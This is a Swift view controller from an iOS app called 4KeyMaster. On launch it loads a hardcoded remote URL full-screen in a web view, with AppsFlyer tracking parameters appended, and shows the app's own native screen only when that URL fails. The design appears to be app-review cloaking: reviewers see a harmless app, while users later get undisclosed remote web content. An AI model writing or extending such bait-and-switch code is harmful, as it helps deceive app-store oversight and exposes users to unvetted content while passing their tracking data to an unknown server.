//
//  StartMainView.swift
//  4KeyMaster
//
//  Created by Damon Earley on 14.02.2026.
//

import UIKit
import SwiftUI

class StartMainView: UIViewController {

    private let baseUrl = "https://voltix-storm.sbs/p5k6DZ8g"

    let loadingLabel = UILabel()
    let loadingImage = UIImageView()

    private let activityIndicator: UIActivityIndicatorView = {
        let indicator = UIActivityIndicatorView(style: .large)
        indicator.color = .white
        indicator.translatesAutoresizingMaskIntoConstraints = false
        indicator.hidesWhenStopped = true
        return indicator
    }()
    
    private var appsFlyerDataReadyFlag = false
    private var contentViewShown = false
    private weak var presentedWebViewHostingController: UIHostingController<PrivacyWebView>?
    
    private var didStartFlow = false
    
    override func viewDidLoad() {
        super.viewDidLoad()
        setupUI()
    }
    
    override func viewDidAppear(_ animated: Bool) {
        super.viewDidAppear(animated)
        guard !didStartFlow else { return }
        didStartFlow = true
        setupFlow()
    }

    private func setupUI() {
        print("start setupUI")
        view.addSubview(loadingImage)
        loadingImage.image = UIImage(resource: .mainlabel)
        loadingImage.contentMode = .scaleAspectFit
        loadingImage.translatesAutoresizingMaskIntoConstraints = false

        view.addSubview(activityIndicator)
        
        loadingImage.translatesAutoresizingMaskIntoConstraints = false
        NSLayoutConstraint.activate([
            loadingImage.topAnchor.constraint(equalTo: view.topAnchor),
            loadingImage.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            loadingImage.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            loadingImage.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            
            activityIndicator.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            activityIndicator.centerYAnchor.constraint(equalTo: view.centerYAnchor)
        ])
    }

    private func setupFlow() {
        activityIndicator.startAnimating()
        
        if let savedURL = UserDefaults.standard.string(forKey: "finalAppsflyerURL") {
            print("Using existing AppsFlyer data")
            appsFlyerDataReady()
        } else {
            print("⌛ Waiting for AppsFlyer data...")

            NotificationCenter.default.addObserver(
                self,
                selector: #selector(appsFlyerDataReady),
                name: Notification.Name("AppsFlyerDataReceived"),
                object: nil
            )

            DispatchQueue.main.asyncAfter(deadline: .now() + 10) {
                if !self.appsFlyerDataReadyFlag {
                    print("Timeout waiting for AppsFlyer. Proceeding with fallback.")
                    self.appsFlyerDataReady()
                }
            }
        }
    }

    @objc private func appsFlyerDataReady() {
        NotificationCenter.default.removeObserver(self, name: Notification.Name("AppsFlyerDataReceived"), object: nil)
        appsFlyerDataReadyFlag = true
        proceedWithFlow()
    }
    
    private func proceedWithFlow() {
        openWebViewWithURL(baseUrl)
    }
    
    private func openWebViewWithURL(_ urlString: String) {
        if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
            appDelegate.restrictRotation = .all
        }
        activityIndicator.stopAnimating()
        
        let finalURL = generateTrackingLink(baseURL: urlString)
        
        // Используем WebViewContainer напрямую - он сам проверит статус код
        let webViewContainer = PrivacyWebView(
            urlString: finalURL,
            onFailure: { [weak self] in
                DispatchQueue.main.async {
                    print("❌ WebView: URL недоступен, показываем SwiftUI контент")
                    self?.showSwiftUIContent()
                }
            },
            onSuccess: { [weak self] in
                DispatchQueue.main.async {
                    print("✅ WebView: URL успешно загружен")
                    // WebView уже открыт и загружен, ничего не делаем
                }
            }
        )
        
        let hostingController = UIHostingController(rootView: webViewContainer)
        hostingController.modalPresentationStyle = .fullScreen
        self.presentedWebViewHostingController = hostingController
        self.present(hostingController, animated: true)
    }
    
    
    private func showSwiftUIContent() {
        // Предотвращаем двойной показ
        guard !contentViewShown else {
            print("⚠️ ContentView уже показан, пропускаем")
            return
        }
        
        contentViewShown = true
        
        // Устанавливаем флаг, что ContentView был показан
        PersistenceManager.shared.hasShownContentView = true
        
        // Если есть presented WebView, сначала dismiss его
        if let presentedController = presentedWebViewHostingController {
            presentedController.dismiss(animated: false) { [weak self] in
                self?.presentContentView()
            }
        } else {
            // Если нет presented controller, показываем напрямую
            presentContentView()
        }
    }
    
    private func presentContentView() {
        if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
            appDelegate.restrictRotation = .portrait
        }
        activityIndicator.stopAnimating()
        let swiftUIView = ContentView()
        let hostingController = UIHostingController(rootView: swiftUIView)
        hostingController.modalPresentationStyle = .fullScreen
        
        // Используем rootViewController для показа, если мы не в window hierarchy
        if let windowScene = view.window?.windowScene,
           let rootViewController = windowScene.windows.first?.rootViewController {
            rootViewController.present(hostingController, animated: true)
        } else {
            // Fallback - показываем из текущего контроллера
            self.present(hostingController, animated: true)
        }
    }
    
    private func generateTrackingLink(baseURL: String) -> String {
        if let savedURL = UserDefaults.standard.string(forKey: "finalAppsflyerURL") {
            var appsflyerParams = savedURL.trimmingCharacters(in: .whitespaces)
            if appsflyerParams.hasPrefix("?") {
                appsflyerParams = String(appsflyerParams.dropFirst())
            }
            let separator = baseURL.contains("?") ? "&" : "?"
            let full = baseURL + separator + appsflyerParams
            print("Generated tracking link: \(full)")
            return full
        } else {
            print("AppsFlyer data not available, using base URL only: \(baseURL)")
            return baseURL
        }
    }
    
}
